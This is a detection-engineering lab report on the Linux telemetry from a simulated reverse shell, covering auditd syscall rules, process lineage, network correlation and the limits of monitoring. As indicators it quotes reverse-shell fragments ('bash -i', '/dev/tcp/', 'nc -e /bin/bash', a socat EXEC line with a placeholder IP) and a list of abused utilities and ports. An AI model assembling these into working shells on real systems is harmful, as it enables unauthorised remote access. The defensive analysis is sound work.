# Reverse Shell Execution Telemetry Analysis

---

# Overview

This document describes the telemetry observed during the Linux reverse shell execution simulation conducted in the Detection Engineering Lab environment.

The telemetry analysis focuses on:

- process execution visibility
- shell execution telemetry
- outbound network activity
- process lineage correlation
- syscall visibility
- command-line analytics
- telemetry gaps and limitations
- telemetry engineering challenges

The purpose of this analysis is to understand how reverse shell behavior appears within Linux telemetry sources and determine which artifacts provide the highest detection value.

---

# Simulation Objective

The reverse shell execution simulation was designed to emulate attacker post-exploitation behavior where a compromised Linux host establishes an outbound callback connection to a remote listener.

The telemetry collection process aimed to observe:

- shell execution behavior
- outbound connection activity
- process hierarchy
- reverse shell command syntax
- shell-to-network correlation
- auditd syscall visibility

---

# ATT&CK Mapping

| Category | Technique |
|---|---|
| Execution | T1059 — Command and Scripting Interpreter |
| Unix Shell | T1059.004 |
| Command and Control | T1071 |
| Tool Transfer | T1105 |

---

# Telemetry Sources

## Primary Telemetry Sources

| Source | Purpose |
|---|---|
| auditd | syscall monitoring |
| process execution logs | shell activity visibility |
| process lineage telemetry | parent-child relationships |
| network telemetry | outbound callback visibility |
| shell command history | execution context |
| terminal session output | behavioral validation |

---

# Expected Telemetry Goals

The simulation expected to generate telemetry for:

- shell execution
- interactive shell invocation
- outbound network connections
- networking utility execution
- process ancestry
- suspicious command-line patterns
- syscall activity
- TCP callback behavior

---

# Process Execution Telemetry

## Observed Shell Execution

The simulation generated execution activity involving:

```text
/bin/bash
/bin/sh
```

Observed execution behavior included:

- interactive shell invocation
- shell spawning
- command execution
- shell redirection behavior
- networking utility invocation

---

# Command-Line Telemetry

## High-Value Command-Line Indicators

The following command-line patterns provided significant detection value.

### Interactive Shell Invocation

```bash
bash -i
```

### TCP Redirection

```bash
/dev/tcp/
```

### File Descriptor Redirection

```bash
0>&1
```

### Reverse Shell Redirection

```bash
>&
```

These indicators were critical because they directly exposed reverse shell behavior.

---

# Reverse Shell Utility Telemetry

## Monitored Utilities

The simulation focused on utilities commonly abused for reverse shell activity.

```text
nc
netcat
curl
wget
python
perl
php
socat
openssl
```

---

# Utility Execution Observations

## Netcat-Based Telemetry

Observed indicators:

- shell execution through netcat
- outbound TCP communication
- process spawning behavior

Example telemetry indicators:

```bash
nc -e /bin/bash
```

---

## Python Reverse Shell Telemetry

Observed indicators:

```python
python -c 'import socket,subprocess,os'
```

Telemetry value:

- inline code execution visibility
- socket module usage
- subprocess spawning indicators

---

## Socat Reverse Shell Telemetry

Observed indicators:

```bash
socat TCP:IP:PORT EXEC:/bin/bash
```

Telemetry value:

- TCP callback visibility
- shell execution through socket relay

---

# Process Lineage Telemetry

## Investigation Focus

The simulation analyzed parent-child process relationships to identify suspicious execution chains.

---

# High-Value Parent Processes

| Parent Process | Detection Relevance |
|---|---|
| apache2 | web exploitation |
| nginx | web shell execution |
| python | script-based execution |
| perl | scripting abuse |
| cron | persistence-triggered shell |
| systemd | service-based execution |

---

# Example Process Chains

## Web Exploitation Chain

```text
apache2
 └── bash
      └── nc
```

---

## Malicious Service Chain

```text
systemd
 └── bash
      └── outbound connection
```

---

## Scripted Reverse Shell Chain

```text
python
 └── sh
      └── TCP callback
```

---

# Process Lineage Telemetry Value

Process lineage provided:

- execution context
- attack chain visibility
- parent-child correlation
- suspicious ancestry identification
- attacker behavior reconstruction

Process lineage significantly improved detection confidence.

---

# Network Telemetry

## Observed Network Behaviors

The simulation attempted to generate outbound callback activity consistent with reverse shell behavior.

Observed indicators included:

- outbound TCP connections
- callback attempts
- shell-associated network activity
- external destination communication
- process-linked outbound traffic

---

# High-Risk Reverse Shell Ports

The following ports were monitored because they are frequently abused in reverse shell scenarios:

```text
4444
4445
5555
8080
9001
1337
```

However, telemetry analysis confirmed that port-based detection alone is weak because attackers may use arbitrary ports.

---

# Shell-to-Network Correlation

## Highest-Value Detection Signal

The strongest telemetry signal observed during the simulation was:

```text
Shell Execution
    +
Outbound Network Activity
```

This behavioral combination produced significantly higher detection fidelity compared to isolated events.

---

# Auditd Telemetry Analysis

# Relevant Syscalls

The following syscalls were important during telemetry analysis:

```text
execve
connect
socket
dup2
```

---

# execve Telemetry

## Detection Value

The `execve` syscall provided:

- executed binary visibility
- command-line arguments
- process execution evidence
- shell invocation telemetry

---

# connect Telemetry

## Detection Value

The `connect` syscall provided:

- outbound connection visibility
- callback attempt telemetry
- destination connection context

---

# socket Telemetry

## Detection Value

The `socket` syscall provided:

- network socket creation visibility
- process-linked networking activity

---

# dup2 Telemetry

## Detection Value

The `dup2` syscall was important because many reverse shells redirect file descriptors to establish interactive communication channels.

---

# Auditd Rule Dependencies

The simulation demonstrated that telemetry quality depended heavily on active auditd rules.

---

# Required Auditd Rules

## Process Execution Monitoring

```bash
-a always,exit -F arch=b64 -S execve -k exec_monitor
```

---

## Network Connection Monitoring

```bash
-a always,exit -F arch=b64 -S connect -k network_connect
```

---

## Socket Monitoring

```bash
-a always,exit -F arch=b64 -S socket -k socket_monitor
```

---

# Telemetry Challenges

# Challenge 1 — Missing Shell Visibility

## Problem

The simulation revealed that shell execution telemetry was incomplete when auditd rules were insufficient.

In several cases:

- bash execution was not fully captured
- command-line visibility was inconsistent
- shell process telemetry was partial

---

## Root Cause

The primary cause was insufficient syscall monitoring coverage.

Without proper:

- execve auditing
- process execution logging
- shell monitoring rules

reverse shell visibility degraded significantly.

---

# Challenge 2 — Weak Network Correlation

## Problem

Outbound callback activity was difficult to correlate directly with shell execution in some telemetry sources.

Observed limitations:

- network telemetry lacked process context
- callback telemetry lacked parent-child relationships
- outbound traffic attribution was incomplete

---

## Root Cause

Network telemetry and process telemetry existed in separate visibility layers.

Without PID correlation:

- shell-to-network analytics weakened
- reverse shell attribution became unreliable

---

# Challenge 3 — Incomplete Process Lineage

## Problem

Process hierarchy visibility varied depending on telemetry source quality.

Some tooling failed to fully preserve:

- parent-child relationships
- ancestry chains
- intermediate processes

---

## Observation

Certain process trees appeared differently across:

- htop
- pstree
- auditd logs
- process execution telemetry

This inconsistency complicated behavioral reconstruction.

---

# Challenge 4 — Short-Lived Process Visibility

## Problem

Reverse shell processes were sometimes short-lived and difficult to capture reliably.

Observed issues included:

- transient shell execution
- rapidly terminating utilities
- incomplete telemetry collection windows

---

## Impact

Short-lived processes reduced:

- process visibility
- command-line capture reliability
- forensic reconstruction quality

---

# Challenge 5 — Behavioral Ambiguity

## Problem

Several reverse shell indicators also appear in legitimate administrative activity.

Examples:

- netcat troubleshooting
- automation scripts
- remote administration
- developer testing

---

## Impact

Single-event detections produced elevated false-positive risk.

Behavioral correlation was required to improve fidelity.

---

# High-Value Telemetry Fields

## Process Telemetry Fields

| Field | Detection Value |
|---|---|
| Image | executed binary |
| CommandLine | reverse shell syntax |
| ParentImage | execution lineage |
| PID | process correlation |
| PPID | ancestry reconstruction |
| User | execution context |
| Timestamp | sequencing |

---

# Network Telemetry Fields

| Field | Detection Value |
|---|---|
| SourceIP | affected host |
| DestinationIP | callback destination |
| DestinationPort | listener identification |
| ProcessName | originating process |
| PID | process correlation |
| Protocol | TCP/UDP visibility |

---

# Detection Engineering Observations

The simulation produced several important detection engineering insights.

---

# Observation 1 — Command-Line Telemetry Is Critical

The highest-fidelity indicators originated from:

- `/dev/tcp/`
- `0>&1`
- `bash -i`
- `nc -e`
- `EXEC:/bin/bash`

These patterns strongly exposed reverse shell behavior.

---

# Observation 2 — Behavioral Correlation Is Essential

Reliable detection required correlation between:

```text
Shell Execution
    +
Process Lineage
    +
Outbound Network Activity
```

Single telemetry artifacts were insufficient.

---

# Observation 3 — Parent-Child Context Increases Fidelity

Suspicious ancestry significantly improved detection confidence.

Examples:

```text
apache2 → bash
systemd → bash
python → sh
```

These chains strongly indicated attacker behavior.

---

# Observation 4 — Network Telemetry Alone Is Weak

Outbound TCP activity without process correlation generated poor detection fidelity.

Process-linked networking telemetry was significantly stronger.

---

# Telemetry Quality Assessment

| Telemetry Source | Quality |
|---|---|
| Process execution telemetry | High |
| Command-line visibility | High |
| Process lineage telemetry | Medium-High |
| Network telemetry | Medium |
| Socket telemetry | Medium |
| Syscall telemetry | Medium-High |

---

# Final Telemetry Assessment

The reverse shell execution simulation successfully generated telemetry suitable for:

- detection engineering
- Sigma rule development
- ATT&CK mapping
- process lineage analysis
- behavioral analytics
- investigation workflows

The simulation also demonstrated that:

- shell telemetry alone is insufficient
- network telemetry alone is insufficient
- behavioral correlation is mandatory
- process lineage is critical
- command-line analytics provide the strongest indicators

---

# Recommended Evidence Collection

| Evidence | Purpose |
|---|---|
| reverse-shell-terminal.png | shell execution proof |
| process-lineage-proof.png | ancestry visibility |
| outbound-connection-proof.png | callback evidence |
| auditd-execve-proof.png | syscall telemetry |
| detection-trigger-proof.png | Sigma validation |
| listener-session-proof.png | remote shell confirmation |

---

# Final Conclusion

The reverse shell simulation generated realistic Linux telemetry associated with attacker post-exploitation behavior.

The highest-value telemetry originated from:

- shell execution analytics
- command-line visibility
- process lineage correlation
- shell-to-network behavioral relationships

The simulation validated that reliable reverse shell detection depends on multi-layer telemetry correlation rather than isolated indicators.
